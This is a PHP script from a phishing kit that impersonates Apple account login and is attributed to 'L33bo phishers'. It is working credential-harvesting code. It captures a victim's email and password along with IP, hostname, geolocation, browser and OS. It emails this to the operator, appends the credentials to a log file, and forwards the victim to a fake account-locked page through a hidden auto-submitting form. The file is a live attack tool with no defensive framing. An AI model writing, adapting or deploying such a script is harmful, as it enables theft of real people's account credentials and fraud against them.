<?
/*
||| L33bo phishers = ICQ: 695059760
*/
@require "session_protect.php";
@require "functions.php";
@require "../../detect.php";
@require "../../tytyd.php";
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "Platform :"." ".$systemInfo['os'];
$apeluser = $_SESSION['user'] = $_POST['user']; 
$apelpass = $_SESSION['pass'] = $_POST['pass']; 
$kontol = "
++--------------[$] [B]OCA[H]SHO[P] [$]--------------++

  -----------------------------------------------------------------
# Email :  $apeluser
# Pass  :  $apelpass
  -----------------------------------------------------------------
  ------------------------------------------------------------------------------
# IP Addrs    :  ".$_SERVER['REMOTE_ADDR']." 
# Hostname    :   ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."
# Location    :   ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country']."
# Browser    :   ".$systemInfo['browser']."
# Platform    :   ".$systemInfo['os']."
# Useragent    :   ".$systemInfo['useragent']."
  ------------------------------------------------------------------------------
";
$headers = "From: Akun Apel <apel@bocah.team>";
$subject = "[ ".$nama_negara." ] [ ".$ip." ] [ ".$systemInfo['os']." ]";
$empas   = "# $apeluser || $apelpass [ ".$nama_negara." ]\n";
if(strlen($apeluser) >= $elang && strlen($apelpass) >= $plang && preg_match("/@/", $apeluser) && preg_match("/\./", $apeluser))
{
    if($res == "d"){
@mail($Your_Email,$subject,$kontol,$headers);
}
    $file = fopen("../logs/bxp.log", "a");
    fwrite($file, $empas);
    fclose($file);
    
    $file2 = $_SERVER['DOCUMENT_ROOT']."/bocah/logs/._loginz_.txt";
    $isi  = @file_get_contents($file2);
    $buka = fopen($file2,"w"); 
        
    fwrite($buka, $isi+1);
    fclose($buka);
?>
<form action='../locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionsid=<?php echo generateRandomString(115); ?>&protocol=ssl' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>
<?php }
else {
  echo '<meta http-equiv="refresh" content="0;url=../../LoginFailed.php?protocol=ssl&sessionsid=' . md5(gmdate("r")) . sha1(gmdate("r")) . '" />';
    exit();  
}
?>
}